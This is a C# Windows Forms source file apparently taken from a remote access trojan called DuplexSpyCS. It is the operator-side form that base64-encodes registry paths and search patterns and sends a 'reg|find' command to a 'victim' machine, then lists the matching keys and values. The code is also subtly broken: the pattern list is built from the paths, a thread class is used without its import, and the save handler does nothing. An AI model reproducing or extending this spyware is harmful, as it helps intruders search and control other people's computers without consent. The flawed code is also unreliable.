using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmRegFind : Form
    {
        public clsVictim v;
        public string currentPath;

        public frmRegFind()
        {
            InitializeComponent();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="lsKey">Item1: k(key)/v(value), Item2: Full path</param>
        /// <param name="lsVal"></param>
        public void ShowFindResult(List<(string, string)> lsKey, List<(string, string)> lsVal)
        {
            //Key
            foreach (var x in lsKey)
            {
                string[] pathSplit = x.Item2.Split('\\');
                ListViewItem item = new ListViewItem(pathSplit.Last());
                item.SubItems.Add(x.Item1);
                item.SubItems.Add(x.Item2);

                Invoke(new Action(() => listView1.Items.Add(item)));
            }

            //Value
            foreach (var x in lsVal)
            {
                string[] pathSplit = x.Item2.Split('\\');
                ListViewItem item = new ListViewItem(pathSplit.Last());
                item.SubItems.Add(x.Item1);
                item.SubItems.Add(x.Item2);

                Invoke(new Action(() => listView1.Items.Add(item)));
            }
        }

        void setup()
        {
            textBox1.Text = currentPath;
            textBox2.Text = "RegexPattern";
        }

        private void frmRegFind_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            int method = 0;
            int ignoreCase = 1;
            int dwItemType = 2;
            RegistryValueKind keyKind = RegistryValueKind.Unknown; //if Unknown, we search all kind.

            string[] paths = textBox1.Lines.Where(x => !string.Equals(x, Environment.NewLine)).ToArray();
            string[] patterns = textBox2.Lines.Where(x => !string.Equals(x, Environment.NewLine)).ToArray();

            new Thread(() =>
            {
                string b64Paths = string.Join(",", paths.Select(x => clsCrypto.b64E2Str(x)).ToArray());
                string b64Patterns = string.Join(",", paths.Select(x => clsCrypto.b64E2Str(x)).ToArray());

                v.SendCommand($"reg|find|{b64Paths}|{b64Patterns}|{method}|{ignoreCase}|{dwItemType}|{keyKind.ToString()}");
            }).Start();
        }

        //Setting
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            new frmSetting().ShowDialog();
        }
        //Help
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\RegFind").Show();
        }

        //Save
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();

            if (sfd.ShowDialog() == DialogResult.OK)
            {

            }
        }
    }
}